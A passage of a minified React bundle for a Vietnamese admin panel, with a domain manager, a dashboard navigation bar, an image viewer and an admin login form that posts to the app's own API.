                            })
                        }), l.jsx("p", {
                            className: `text-sm font-medium ${p.type === "success" ? "text-green-800" : ""} ${p.type === "error" ? "text-red-800" : ""} ${p.type === "info" ? "text-blue-800" : ""} `,
                            children: p.message
                        })]
                    }), l.jsx("button", {
                        onClick: () => m({
                            message: null,
                            type: "info"
                        }),
                        className: `absolute right-2 top-1/2 -translate-y-1/2 rounded-full p-1 transition-colors ${p.type === "success" ? "text-green-500 hover:bg-green-50" : ""} ${p.type === "error" ? "text-red-500 hover:bg-red-50" : ""} ${p.type === "info" ? "text-blue-500 hover:bg-blue-50" : ""} `,
                        children: l.jsx(ue, {
                            icon: Xr,
                            className: "h-4 w-4"
                        })
                    })]
                })
            })
        }), Me.isOpen && Me.image && l.jsxs("div", {
            className: "fixed inset-0 z-[200] flex items-center justify-center p-4",
            children: [l.jsx("div", {
                className: "absolute inset-0 bg-purple-900/30 backdrop-blur-md",
                onClick: () => tt({
                    isOpen: !1,
                    image: null
                })
            }), l.jsx("div", {
                className: "relative h-full w-full max-w-7xl animate-fade-in",
                children: l.jsx("div", {
                    className: "flex h-full items-center justify-center",
                    children: l.jsx("div", {
                        className: "relative w-full overflow-hidden rounded-3xl bg-white/10 p-1 backdrop-blur-lg",
                        children: l.jsxs("div", {
                            className: "relative rounded-2xl bg-white p-6 shadow-2xl",
                            children: [l.jsx("div", {
                                className: "absolute right-4 top-4 z-10 transform",
                                children: l.jsx("button", {
                                    onClick: () => tt({
                                        isOpen: !1,
                                        image: null
                                    }),
                                    className: "group flex h-12 w-12 border-collapse items-center justify-center rounded-full border border-purple-200 bg-white shadow-lg transition-all duration-200 hover:scale-105 hover:bg-purple-50 hover:shadow-xl",
                                    children: l.jsx(ue, {
                                        icon: Xr,
                                        className: "h-5 w-5 text-purple-600 transition-colors group-hover:text-purple-700"
                                    })
                                })
                            }), l.jsx("div", {
                                className: "relative mx-auto max-h-[75vh] overflow-hidden rounded-lg",
                                children: Me.image && l.jsx("img", {
                                    src: Me.image.url + "?token=" + y,
                                    alt: Me.image.filename,
                                    className: "max-h-[75vh] w-full object-contain",
                                    style: {
                                        maxWidth: "100%",
                                        height: "auto",
                                        display: "block",
                                        margin: "0 auto"
                                    }
                                })
                            }), l.jsxs("div", {
                                className: "mt-6 flex items-center justify-between px-2",
                                children: [l.jsxs("div", {
                                    className: "flex-1 pr-4",
                                    children: [l.jsx("h3", {
                                        className: "truncate text-lg font-semibold text-purple-900",
                                        children: Me.image.filename
                                    }), l.jsxs("p", {
                                        className: "text-sm text-purple-500",
                                        children: ["Ngày tạo:", " ", Me.image.created]
                                    })]
                                }), Me.image && l.jsx("button", {
                                    onClick: () => {
                                        var L;
                                        return De(((L = Me.image) == null ? void 0 : L.filename) ?? "")
                                    }
                                    ,
                                    className: "group relative hidden flex-shrink-0 overflow-hidden rounded-xl bg-gradient-to-r from-purple-600 to-pink-500 p-[2px] focus:outline-none focus:ring-2 focus:ring-purple-400 focus:ring-offset-2 sm:flex",
                                    children: l.jsxs("span", {
                                        className: "relative flex items-center rounded-[10px] bg-gradient-to-r from-purple-600 to-pink-500 px-4 py-2 text-sm font-semibold text-white transition-all duration-200 ease-in-out group-hover:bg-none",
                                        children: [l.jsx(ue, {
                                            icon: Ji,
                                            className: "mr-2"
                                        }), "Tải xuống"]
                                    })
                                })]
                            })]
                        })
                    })
                })
            })]
        })]
    })
}
  , t6 = () => {
    const e = Dr()
      , [t,n] = j.useState("")
      , r = ha()
      , [a,o] = j.useState(!1)
      , i = encodeURIComponent(`Server ${t} có vấn đề`)
      , s = () => {
        localStorage.removeItem("token"),
        e("/admin")
    }
      , u = [{
        path: "",
        icon: zb,
        label: `VPS ${t}`
    }, {
        path: "domain",
        icon: Qs,
        label: "Cài Đặt Domain"
    }, {
        path: "telegram",
        icon: qs,
        label: "Cấu Hình Telegram"
    }, {
        path: "website",
        icon: Wb,
        label: "Cài Đặt Website"
    }, {
        path: "account",
        icon: fi,
        label: "Thông Tin Tài Khoản"
    }];
    return j.useEffect( () => {
        Ee.post("/api/admin/check-token", {}, {
            headers: {
                Authorization: `Bearer ${localStorage.getItem("token")}`
            }
        }).then(c => {
            c.data.is_admin && e("/admin/vip")
        }
        ).catch( () => {
            localStorage.removeItem("token"),
            e("/admin")
        }
        ),
        Ee.post("/api/admin/get-info", {}, {
            headers: {
                Authorization: `Bearer ${localStorage.getItem("token")}`
            }
        }).then(c => {
            c.data.name === "admin" ? e("/admin/vip") : n(c.data.name)
        }
        )
    }
    , [e]),
    l.jsxs("div", {
        className: "relative min-h-screen bg-gradient-to-br from-indigo-600 via-purple-600 to-pink-500",
        children: [l.jsx("div", {
            className: "absolute -left-10 -top-10 z-0 h-40 w-40 animate-float rounded-full bg-white/10"
        }), l.jsx("div", {
            className: "absolute right-20 top-40 z-0 h-24 w-24 animate-float-delayed rounded-full bg-white/10"
        }), l.jsx("div", {
            className: "absolute bottom-20 left-1/3 z-0 h-32 w-32 animate-float rounded-full bg-white/10"
        }), l.jsxs("nav", {
            className: "fixed left-0 right-0 top-0 z-50 bg-white/95 shadow-lg backdrop-blur-lg",
            children: [l.jsx("div", {
                className: "mx-auto px-4",
                children: l.jsxs("div", {
                    className: "flex h-16 items-center justify-between",
                    children: [l.jsx("div", {
                        className: "flex items-center",
                        children: l.jsx("h1", {
                            className: "bg-gradient-to-r from-purple-600 to-pink-500 bg-clip-text text-xl font-bold text-transparent",
                            children: "Dashboard"
                        })
                    }), l.jsxs("div", {
                        className: "hidden items-center space-x-1 md:flex",
                        children: [u.map(c => {
                            const f = r.pathname === `/admin/dashboard/${c.path}`;
                            return l.jsxs($p, {
                                to: c.path,
                                className: `flex items-center rounded-lg px-4 py-2 transition-all duration-200 ${f ? "bg-gradient-to-r from-purple-600 to-pink-500 text-white" : "text-purple-900 hover:bg-purple-50"}`,
                                children: [l.jsx(ue, {
                                    icon: c.icon,
                                    className: `h-4 w-4 ${f ? "text-white" : "text-purple-500"}`
                                }), l.jsx("span", {
                                    className: "ml-2 font-medium",
                                    children: c.label
                                })]
                            }, c.path)
                        }
                        ), l.jsxs("button", {
                            onClick: s,
                            className: "flex items-center rounded-lg px-4 py-2 text-purple-900 transition-all duration-200 hover:bg-purple-50",
                            children: [l.jsx(ue, {
                                icon: Gs,
                                className: "h-4 w-4 text-purple-500"
                            }), l.jsx("span", {
                                className: "ml-2 font-medium",
                                children: "Đăng Xuất"
                            })]
                        })]
                    }), l.jsx("div", {
                        className: "md:hidden",
                        children: l.jsx("button", {
                            onClick: () => o(!a),
                            className: "inline-flex items-center justify-center rounded-lg p-2 text-purple-600 hover:bg-purple-50 focus:outline-none focus:ring-2 focus:ring-purple-500",
                            children: l.jsx(ue, {
                                icon: a ? Xr : Hg,
                                className: "h-6 w-6"
                            })
                        })
                    })]
                })
            }), l.jsx("div", {
                className: `fixed inset-x-0 top-16 z-40 transform overflow-hidden bg-white/95 backdrop-blur-lg transition-all duration-500 ease-[cubic-bezier(0.4,0,0.2,1)] ${a ? "translate-y-0 opacity-100" : "-translate-y-[120%] opacity-0"} `,
                children: l.jsxs("div", {
                    className: `space-y-2 p-4 transition-all duration-500 ease-[cubic-bezier(0.4,0,0.2,1)] ${a ? "translate-y-0" : "-translate-y-10"} `,
                    children: [u.map( (c, f) => {
                        const d = r.pathname === `/admin/dashboard/${c.path}`;
                        return l.jsxs($p, {
                            to: c.path,
                            onClick: () => o(!1),
                            className: `flex transform items-center rounded-lg px-3 py-2.5 transition-all duration-300 ${d ? "bg-gradient-to-r from-purple-600 to-pink-500 text-white" : "text-purple-900 hover:bg-purple-50 active:scale-95"} `,
                            style: {
                                opacity: a ? 1 : 0,
                                transform: `translateY(${a ? 0 : 20}px)`,
                                transition: `
											transform 0.4s cubic-bezier(0.4, 0, 0.2, 1) ${f * 60}ms,
											opacity 0.4s cubic-bezier(0.4, 0, 0.2, 1) ${f * 60}ms
										`
                            },
                            children: [l.jsx(ue, {
                                icon: c.icon,
                                className: `h-4 w-4 ${d ? "text-white" : "text-purple-500"}`
                            }), l.jsx("span", {
                                className: "ml-2 font-medium",
                                children: c.label
                            })]
                        }, c.path)
                    }
                    ), l.jsxs("button", {
                        onClick: () => {
                            o(!1),
                            s()
                        }
                        ,
                        className: "flex w-full transform items-center rounded-lg px-3 py-2.5 text-purple-900 transition-all duration-300 hover:bg-purple-50 active:scale-95",
                        style: {
                            opacity: a ? 1 : 0,
                            transform: `translateY(${a ? 0 : 20}px)`,
                            transition: `
									transform 0.4s cubic-bezier(0.4, 0, 0.2, 1) ${u.length * 60}ms,
									opacity 0.4s cubic-bezier(0.4, 0, 0.2, 1) ${u.length * 60}ms
								`
                        },
                        children: [l.jsx(ue, {
                            icon: Gs,
                            className: "h-4 w-4 text-purple-500"
                        }), l.jsx("span", {
                            className: "ml-2 font-medium",
                            children: "Đăng Xuất"
                        })]
                    })]
                })
            })]
        }), l.jsx("div", {
            className: "pt-20",
            children: l.jsx("div", {
                className: "animate-fade-in p-4 lg:p-8",
                children: l.jsx("div", {
                    className: "rounded-2xl",
                    children: l.jsx(Wf, {})
                })
            })
        }), l.jsxs("a", {
            href: `https://t.me/ovftank?text=${i}`,
            target: "_blank",
            rel: "noopener noreferrer",
            className: "fixed bottom-6 right-6 z-50 flex items-center space-x-2 rounded-full bg-white/90 px-6 py-3 text-sm font-medium text-purple-900 shadow-lg backdrop-blur-sm transition-all duration-300 hover:bg-white hover:shadow-purple-500/25 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-offset-2",
            children: [l.jsx("span", {
                className: "relative flex h-8 w-8 items-center justify-center rounded-full bg-gradient-to-r from-purple-600 to-pink-500",
                children: l.jsx(ue, {
                    icon: qs,
                    className: "h-4 w-4 text-white"
                })
            }), l.jsx("span", {
                className: "relative",
                children: "Trợ Giúp"
            })]
        }), l.jsx("div", {
            className: `fixed inset-0 z-30 backdrop-blur-[2px] transition-all duration-500 ease-[cubic-bezier(0.4,0,0.2,1)] ${a ? "bg-black/30 backdrop-blur-[2px]" : "pointer-events-none bg-black/0 backdrop-blur-none"} `,
            onClick: () => o(!1)
        })]
    })
}
  , Lh = () => {
    const [e,t] = j.useState([])
      , [n,r] = j.useState("")
      , [a,o] = j.useState("")
      , [i,s] = j.useState("")
      , [u,c] = j.useState("")
      , [f,d] = j.useState(!1)
      , [h,N] = j.useState(null)
      , [y,S] = j.useState(null)
      , x = async () => {
        try {
            const k = localStorage.getItem("token")
              , A = await (await fetch("/api/admin/domains", {
                headers: {
                    Authorization: `Bearer ${k}`
                }
            })).json();
            t(Array.isArray(A) ? A : [])
        } catch {
            s("Không thể lấy domain")
        }
    }
    ;
    j.useEffect( () => {
        x()
    }
    , []);
    const g = async k => {
        if (k.preventDefault(),
        !n.trim()) {
            S("Vui lòng nhập domain");
            return
        }
        if (!n.includes(".") || n.includes("/")) {
            S("Domain không hợp lệ");
            return
        }
        try {
            const w = localStorage.getItem("token")
              , P = await (await fetch("/api/admin/add-domain", {
                method: "POST",
                headers: {
                    Authorization: `Bearer ${w}`,
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    domain: n
                })
            })).json();
            P.success ? (c("Thêm domain thành công"),
            r(""),
            x()) : s(P.message)
        } catch {
            S("Không thể thêm domain")
        }
    }
      , p = k => {
        N(k),
        d(!0)
    }
      , m = async () => {
        if (h)
            try {
                const k = localStorage.getItem("token")
                  , A = await (await fetch("/api/admin/delete-domain", {
                    method: "POST",
                    headers: {
                        Authorization: `Bearer ${k}`,
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        domain: h
                    })
                })).json();
                A.success ? (c(`Đã xóa domain ${h}`),
                x()) : s(A.message)
            } catch {
                s("Không thể xóa domain")
            } finally {
                d(!1),
                N(null)
            }
    }
      , C = e.filter(k => k.toLowerCase().includes(a.toLowerCase()));
    return l.jsxs("div", {
        className: "",
        children: [l.jsx("div", {
            className: "absolute -left-10 -top-10 z-0 h-40 w-40 animate-float rounded-full bg-white/10"
        }), l.jsx("div", {
            className: "absolute right-20 top-40 z-0 h-24 w-24 animate-float-delayed rounded-full bg-white/10"
        }), l.jsx("div", {
            className: "absolute bottom-20 left-1/3 z-0 h-32 w-32 animate-float rounded-full bg-white/10"
        }), y && l.jsx(El, {
            message: y,
            onClose: () => S(null)
        }), l.jsx("div", {
            className: "relative mx-auto max-w-2xl animate-fade-in",
            children: l.jsx("div", {
                className: "overflow-hidden rounded-3xl bg-white/10 p-1 backdrop-blur-lg",
                children: l.jsxs("div", {
                    className: "relative rounded-2xl bg-white p-4 shadow-2xl sm:p-8",
                    children: [l.jsx("div", {
                        className: "absolute -right-6 -top-6 h-24 w-24 rounded-full bg-gradient-to-br from-purple-600 to-pink-500 opacity-20 blur-lg"
                    }), l.jsx("div", {
                        className: "absolute -left-6 -top-6 h-24 w-24 rounded-full bg-gradient-to-br from-blue-600 to-purple-500 opacity-20 blur-lg"
                    }), l.jsxs("div", {
                        className: "relative space-y-6",
                        children: [l.jsxs("div", {
                            className: "flex flex-col items-center gap-3 sm:flex-row",
                            children: [l.jsx("div", {
                                className: "rounded-full bg-gradient-to-r from-purple-600 to-pink-500 p-2",
                                children: l.jsx(ue, {
                                    icon: Qs,
                                    className: "text-2xl text-white"
                                })
                            }), l.jsx("h1", {
                                className: "text-center text-2xl font-bold text-purple-900 sm:text-left",
                                children: "Quản Lý Domain"
                            })]
                        }), l.jsxs("div", {
                            className: "space-y-4 sm:space-y-6",
                            children: [l.jsxs("div", {
                                className: "relative",
                                children: [l.jsx("input", {
                                    id: "search",
                                    type: "text",
                                    value: a,
                                    onChange: k => o(k.target.value),
                                    placeholder: "Tìm kiếm domain...",
                                    className: "block w-full rounded-xl border border-purple-100 bg-purple-50 px-4 py-3 pl-10 placeholder-purple-400 transition-all duration-200 focus:border-purple-500 focus:bg-white focus:outline-none focus:ring-2 focus:ring-purple-200 sm:py-3.5"
                                }), l.jsx(ue, {
                                    icon: ms,
                                    className: "absolute left-3 top-1/2 -translate-y-1/2 text-purple-400"
                                })]
                            }), l.jsxs("form", {
                                onSubmit: g,
                                className: "flex flex-col gap-3 sm:flex-row",
                                children: [l.jsx("input", {
                                    id: "newDomain",
                                    type: "text",
                                    value: n,
                                    onChange: k => r(k.target.value),
                                    placeholder: "Thêm Domain Mới",
                                    className: "flex-1 rounded-xl border border-purple-100 bg-purple-50 px-4 py-3 placeholder-purple-400 transition-all duration-200 focus:border-purple-500 focus:bg-white focus:outline-none focus:ring-2 focus:ring-purple-200 sm:py-3.5",
                                    autoFocus: !0
                                }), l.jsx("button", {
                                    type: "submit",
                                    className: "group relative overflow-hidden rounded-xl bg-gradient-to-r from-purple-600 to-pink-500 px-6 py-3 font-medium text-white transition-all duration-200 hover:shadow-lg hover:shadow-purple-500/25 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-offset-2 sm:py-3.5",
                                    children: l.jsxs("span", {
                                        className: "relative flex items-center justify-center gap-2",
                                        children: [l.jsx(ue, {
                                            icon: Wg
                                        }), l.jsx("span", {
                                            children: "Thêm Domain"
                                        })]
                                    })
                                })]
                            }), (i || u) && l.jsx("div", {
                                className: `animate-fade-in rounded-xl p-4 backdrop-blur-sm ${i ? "border border-purple-200/50 bg-gradient-to-r from-purple-50/80 via-pink-50/80 to-rose-50/80 text-purple-700 shadow-sm shadow-purple-100" : "border border-purple-200/50 bg-gradient-to-r from-purple-50/80 via-blue-50/80 to-emerald-50/80 text-purple-700 shadow-sm shadow-purple-100"}`,
                                children: l.jsxs("div", {
                                    className: "flex items-center gap-3",
                                    children: [l.jsx(ue, {
                                        icon: i ? Ib : Ub,
                                        className: "text-lg text-purple-500"
                                    }), l.jsx("span", {
                                        className: "font-medium",
                                        children: i || u
                                    })]
                                })
                            }), l.jsxs("div", {
                                className: "rounded-xl border border-purple-100 bg-purple-50/50 p-4 sm:p-6",
                                children: [l.jsx("h3", {
                                    className: "mb-4 text-center text-lg font-semibold text-purple-900 sm:text-left",
                                    children: "Danh Sách Domain"
                                }), l.jsxs("div", {
                                    className: "space-y-3",
                                    children: [C.map(k => l.jsxs("div", {
                                        className: "group flex flex-row items-center justify-between gap-3 rounded-xl border border-purple-100 bg-white p-4 transition-all duration-200 hover:border-purple-200 hover:shadow-sm",
                                        children: [l.jsx("span", {
                                            className: "truncate text-center text-purple-900 sm:text-left",
                                            children: k
                                        }), l.jsxs("button", {
                                            onClick: () => p(k),
                                            className: "inline-flex items-center gap-2 rounded-lg bg-purple-50 px-3 py-2 text-sm font-medium text-purple-600 transition-colors duration-200 hover:bg-purple-100 hover:text-purple-700 focus:outline-none focus:ring-2 focus:ring-purple-200 sm:opacity-0 sm:group-hover:opacity-100",
                                            title: "Xóa domain",
                                            children: [l.jsx(ue, {
                                                icon: Pb
                                            }), l.jsx("span", {
                                                children: "Xóa"
                                            })]
                                        })]
                                    }, k)), e.length === 0 ? l.jsxs("div", {
                                        className: "flex flex-col items-center justify-center rounded-xl border-2 border-dashed border-purple-100 py-8 sm:py-12",
                                        children: [l.jsx(ue, {
                                            icon: Qs,
                                            className: "mb-4 text-4xl text-purple-300 sm:text-6xl"
                                        }), l.jsx("p", {
                                            className: "text-center text-base font-medium text-purple-900 sm:text-lg",
                                            children: "Chưa có domain nào"
                                        })]
                                    }) : C.length === 0 && l.jsxs("div", {
                                        className: "flex flex-col items-center justify-center rounded-xl border-2 border-dashed border-purple-100 py-8 sm:py-12",
                                        children: [l.jsx(ue, {
                                            icon: Vg,
                                            className: "mb-4 text-4xl text-purple-300 sm:text-6xl"
                                        }), l.jsxs("p", {
                                            className: "text-center text-base font-medium text-purple-900 sm:text-lg",
                                            children: ["Không tìm thấy domain", " ", a]
                                        })]
                                    })]
                                })]
                            })]
                        })]
                    })]
                })
            })
        }), f && l.jsx("div", {
            className: "fixed inset-0 z-50 flex items-center justify-center bg-purple-900/30 p-4 backdrop-blur-sm transition-all",
            children: l.jsx("div", {
                className: "w-full max-w-md animate-fade-in overflow-hidden rounded-3xl bg-gradient-to-b from-white/80 to-white/60 p-[1px] shadow-2xl backdrop-blur-lg",
                children: l.jsxs("div", {
                    className: "relative rounded-3xl bg-gradient-to-b from-white via-white to-white/90 p-6",
                    children: [l.jsx("div", {
                        className: "absolute -left-6 -top-6 h-32 w-32 rounded-full bg-gradient-to-br from-purple-600/20 to-pink-500/20 blur-2xl"
                    }), l.jsx("div", {
                        className: "absolute -right-6 -top-6 h-32 w-32 rounded-full bg-gradient-to-br from-blue-600/20 to-purple-500/20 blur-2xl"
                    }), l.jsxs("div", {
                        className: "relative",
                        children: [l.jsx("h3", {
                            className: "mb-4 bg-gradient-to-br from-purple-600 to-pink-500 bg-clip-text text-xl font-bold text-transparent",
                            children: "Xác nhận xóa domain"
                        }), l.jsxs("p", {
                            className: "mb-8 text-purple-700",
                            children: ['Bạn có chắc chắn muốn xóa domain "', l.jsx("span", {
                                className: "font-medium text-purple-900",
                                children: h
                            }), '" không?']
                        }), l.jsxs("div", {
                            className: "flex flex-row justify-end gap-3",
                            children: [l.jsx("button", {
                                onClick: () => d(!1),
                                className: "rounded-xl border border-purple-100 bg-white px-6 py-2.5 font-medium text-purple-600 transition-all hover:bg-purple-50 hover:shadow-sm focus:outline-none focus:ring-2 focus:ring-purple-100",
                                children: "Hủy"
                            }), l.jsx("button", {
                                onClick: m,
                                className: "rounded-xl bg-gradient-to-r from-purple-600 to-pink-500 px-6 py-2.5 font-medium text-white transition-all hover:shadow-lg hover:shadow-purple-500/25 focus:outline-none focus:ring-2 focus:ring-purple-500/50",
                                children: "Xóa"
                            })]
                        })]
                    })]
                })
            })
        })]
    })
}
  , n6 = () => {
    const e = Dr()
      , [t,n] = j.useState({
        username: "",
        password: ""
    })
      , [r,a] = j.useState(!1)
      , [o,i] = j.useState("")
      , [s,u] = j.useState(!1)
      , [c,f] = j.useState(!1)
      , [d,h] = j.useState(!1)
      , N = (x, g) => {
        i(""),
        n(p => ({
            ...p,
            [x]: g
        }))
    }
      , y = async () => {
        h(!0),
        await new Promise(x => setTimeout(x, 1500)),
        f(!0),
        h(!1)
    }
      , S = async x => {
        var g, p, m;
        if (x.preventDefault(),
        !c) {
            i("Vui lòng xác nhận bạn không phải robot");
            return
        }
        if (!t.username.trim() || !t.password.trim()) {
            i("Vui lòng nhập đầy đủ thông tin đăng nhập");
            return
        }
        a(!0),
        i("");
        try {
            const C = await Ee.post("/api/admin/login", t);
            if (C.data.success && C.data.token)
                c ? localStorage.setItem("token", C.data.token) : sessionStorage.setItem("token", C.data.token),
                e("/admin/dashboard");
            else
                throw new Error(C.data.message ?? "Đăng nhập thất bại")
        } catch (C) {
            Ee.isAxiosError(C) && ((p = (g = C.response) == null ? void 0 : g.data) != null && p.message) ? i(C.response.data.message) : i("Đăng nhập thất bại. Vui lòng thử lại."),
            (m = document.getElementById("username")) == null || m.focus()
        } finally {
            a(!1)
        }
    }
    ;
    return j.useEffect( () => {
        localStorage.getItem("token") && Ee.post("/api/admin/check-token", {}, {
            headers: {
                Authorization: `Bearer ${localStorage.getItem("token")}`
            }
        }).then(x => {
            x.data.success && x.data.is_admin ? e("/admin/vip") : e("/admin/dashboard")
        }
        ).catch( () => {
            localStorage.removeItem("token")
        }
        )
    }
    , [e]),
    l.jsxs("div", {
        className: "relative min-h-screen overflow-hidden bg-gradient-to-br from-indigo-600 via-purple-600 to-pink-500",
        children: [l.jsx("div", {
            className: "absolute -left-10 -top-10 z-0 h-40 w-40 animate-float rounded-full bg-white/10"
        }), l.jsx("div", {
            className: "absolute right-20 top-40 z-0 h-24 w-24 animate-float-delayed rounded-full bg-white/10"
        }), l.jsx("div", {
            className: "absolute bottom-20 left-1/3 z-0 h-32 w-32 animate-float rounded-full bg-white/10"
        }), l.jsx("div", {
            className: "flex min-h-screen items-center justify-center px-4 py-12 sm:px-6 lg:px-8",
            children: l.jsx("div", {
                className: "w-full max-w-md animate-fade-in",
                children: l.jsx("div", {
                    className: "overflow-hidden rounded-3xl bg-white/10 p-1 backdrop-blur-lg",
                    children: l.jsxs("div", {
                        className: "relative rounded-2xl bg-white p-8 shadow-2xl",
                        children: [l.jsx("div", {
                            className: "absolute -right-6 -top-6 h-24 w-24 rounded-full bg-gradient-to-br from-purple-600 to-pink-500 opacity-20 blur-lg"
                        }), l.jsx("div", {
                            className: "absolute -left-6 -top-6 h-24 w-24 rounded-full bg-gradient-to-br from-blue-600 to-purple-500 opacity-20 blur-lg"
                        }), l.jsxs("div", {
                            className: "relative space-y-8",
                            children: [l.jsxs("div", {
                                className: "text-center",
                                children: [l.jsx("div", {
                                    className: "mx-auto mb-4 h-16 w-16 rounded-full bg-gradient-to-r from-purple-600 to-pink-500 p-[2px]",
                                    children: l.jsx("div", {
                                        className: "flex h-full w-full items-center justify-center rounded-full bg-white",
                                        children: l.jsxs("svg", {
                                            className: "h-8 w-8",
                                            viewBox: "0 0 24 24",
                                            fill: "none",
                                            xmlns: "http://www.w3.org/2000/svg",
                                            children: [l.jsx("path", {
                                                d: "M12 12C14.7614 12 17 9.76142 17 7C17 4.23858 14.7614 2 12 2C9.23858 2 7 4.23858 7 7C7 9.76142 9.23858 12 12 12Z",
                                                className: "fill-[url(#userIconGradient)]"
                                            }), l.jsx("path", {
                                                d: "M12.0002 14.5C6.99016 14.5 2.91016 17.86 2.91016 22C2.91016 22.28 3.13016 22.5 3.41016 22.5H20.5902C20.8702 22.5 21.0902 22.28 21.0902 22C21.0902 17.86 17.0102 14.5 12.0002 14.5Z",
                                                className: "fill-[url(#userIconGradient)]"
                                            }), l.jsx("defs", {
                                                children: l.jsxs("linearGradient", {
                                                    id: "userIconGradient",
                                                    x1: "2",
                                                    y1: "2",
                                                    x2: "22",
                                                    y2: "22",
                                                    gradientUnits: "userSpaceOnUse",
                                                    children: [l.jsx("stop", {
                                                        className: "stop-color-purple-600"
                                                    }), l.jsx("stop", {
                                                        offset: "1",
                                                        className: "stop-color-pink-500"
                                                    })]
                                                })
                                            })]
                                        })
                                    })
                                }), l.jsx("h2", {
                                    className: "text-2xl font-bold tracking-tight text-gray-900",
                                    children: "Đăng Nhập Quản Trị"
                                }), l.jsx("p", {
                                    className: "mt-2 text-sm text-gray-600",
                                    children: "Đăng nhập để truy cập trang quản trị"
                                })]
                            }), l.jsxs("form", {
                                className: "space-y-6",
                                onSubmit: S,
                                noValidate: !0,
                                children: [o && l.jsx("div", {
                                    className: "animate-shake rounded-lg bg-red-50 p-4",
                                    role: "alert",
                                    children: l.jsx("div", {
                                        className: "text-sm text-red-600",
                                        children: o
                                    })
                                }), l.jsxs("div", {
                                    className: "space-y-4",
                                    children: [l.jsxs("div", {
                                        className: "group relative",
                                        children: [l.jsx("span", {
                                            className: "absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 transition-colors group-focus-within:text-purple-500",
                                            children: l.jsx(ue, {
                                                icon: fi
                                            })
                                        }), l.jsx("input", {
                                            id: "username",
                                            name: "username",
                                            type: "text",
                                            autoComplete: "username",
                                            autoFocus: !0,
                                            required: !0,
                                            className: "block w-full rounded-xl border border-gray-200 bg-gray-50 py-3.5 pl-10 pr-3 text-gray-900 placeholder-gray-400 transition-all duration-200 ease-in-out focus:border-purple-500 focus:bg-white focus:outline-none focus:ring-2 focus:ring-purple-200",
                                            placeholder: "Tên đăng nhập",
                                            value: t.username,
                                            onChange: x => N("username", x.target.value)
                                        })]
                                    }), l.jsxs("div", {
                                        className: "group relative",
                                        children: [l.jsx("span", {
                                            className: "absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 transition-colors group-focus-within:text-purple-500",
                                            children: l.jsx(ue, {
                                                icon: Mb
                                            })
                                        }), l.jsx("input", {
                                            id: "password",
                                            name: "password",
                                            type: s ? "text" : "password",
                                            autoComplete: "current-password",
                                            required: !0,
                                            className: "block w-full rounded-xl border border-gray-200 bg-gray-50 py-3.5 pl-10 pr-12 text-gray-900 placeholder-gray-400 transition-all duration-200 ease-in-out focus:border-purple-500 focus:bg-white focus:outline-none focus:ring-2 focus:ring-purple-200",
                                            placeholder: "Mật khẩu",
                                            value: t.password,
                                            onChange: x => N("password", x.target.value)
                                        }), l.jsx("button", {
                                            type: "button",
                                            onClick: () => u(!s),
                                            tabIndex: -1,
                                            className: "absolute right-3 top-1/2 -translate-y-1/2 rounded-full p-1 text-gray-400 hover:text-gray-600 focus:outline-none focus:ring-2 focus:ring-purple-200 focus:ring-offset-2",
                                            "aria-label": s ? "Ẩn mật khẩu" : "Hiện mật khẩu",
                                            children: l.jsx(ue, {
                                                icon: s ? Ys : Xs
                                            })
                                        })]
                                    })]
                                }), l.jsx("div", {
                                    className: "flex items-center justify-between space-x-4",
                                    children: l.jsxs("label", {
                                        className: "group flex cursor-pointer items-center",
                                        children: [l.jsxs("div", {
                                            className: "relative",
                                            children: [l.jsx("input", {
                                                type: "checkbox",
                                                className: "sr-only",
                                                checked: c,
                                                onChange: y,
                                                disabled: d || c,
                                                tabIndex: -1
                                            }), l.jsx("div", {
                                                className: "h-5 w-5 rounded border border-gray-300 bg-white transition-all duration-200 group-hover:border-purple-500",
                                                children: l.jsx("div", {
                                                    className: `absolute inset-0 flex items-center justify-center transition-all duration-200 ${c || d ? "opacity-100" : "opacity-0"}`,
                                                    tabIndex: -1,
                                                    children: d ? l.jsx(ue, {
                                                        icon: kc,
                                                        className: "h-3 w-3 animate-spin text-purple-500"
                                                    }) : l.jsx("div", {
                                                        className: "h-3 w-3 rounded-sm bg-gradient-to-r from-purple-600 to-pink-500",
                                                        children: l.jsx(ue, {
                                                            icon: oo,
                                                            className: "h-3 w-3 text-white"
                                                        })
                                                    })
                                                })
                                            })]
                                        }), l.jsx("span", {
                                            className: "ml-2 select-none text-sm text-gray-600",
                                            children: "Tôi không phải robot"
                                        })]
                                    })
                                }), l.jsx("div", {
                                    children: l.jsx("button", {
                                        type: "submit",
                                        disabled: r,
                                        className: "group relative w-full overflow-hidden rounded-xl bg-gradient-to-r from-purple-600 to-pink-500 p-[2px] focus:outline-none focus:ring-2 focus:ring-purple-400 focus:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-70",
                                        children: l.jsx("span", {
                                            className: "relative block rounded-[10px] bg-gradient-to-r from-purple-600 to-pink-500 px-4 py-3.5 text-center text-sm font-semibold text-white transition-all duration-200 ease-in-out group-hover:bg-none group-focus:bg-none",
                                            children: r ? l.jsxs(l.Fragment, {
                                                children: [l.jsx(ue, {
                                                    icon: kc,
                                                    className: "mr-2 animate-spin"
                                                }), "Đang đăng nhập..."]
                                            }) : "Đăng nhập"
                                        })
                                    })
                                })]
                            })]
                        })]
                    })
                })
            })
        }), l.jsxs("a", {
            href: "https://t.me/ovftank",
            target: "_blank",
            rel: "noopener noreferrer",
            className: "fixed bottom-6 right-6 z-50 flex items-center space-x-2 rounded-full bg-white/90 px-4 py-2 text-sm font-medium text-gray-700 shadow-lg backdrop-blur-sm transition-all duration-300 hover:bg-white hover:shadow-purple-500/25 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-offset-2",
            tabIndex: -1,
            children: [l.jsx("span", {
                className: "relative flex h-8 w-8 items-center justify-center rounded-full bg-gradient-to-r from-purple-600 to-pink-500",
                children: l.jsx(ue, {
                    icon: qs,
                    className: "h-4 w-4 text-white"
                })
            }), l.jsx("span", {
                className: "relative",
                children: "Hỗ trợ"
            })]
        })]
    })
}
;
function r6(e) {
    var t = typeof e;
    return e != null && (t == "object" || t == "function")
}
var P1 = r6
  , a6 = typeof Ai == "object" && Ai && Ai.Object === Object && Ai
  , o6 = a6
  , i6 = o6
  , s6 = typeof self == "object" && self && self.Object === Object && self
  , l6 = i6 || s6 || Function("return this")()
  , O1 = l6
  , u6 = O1
  , c6 = function() {
    return u6.Date.now()
}
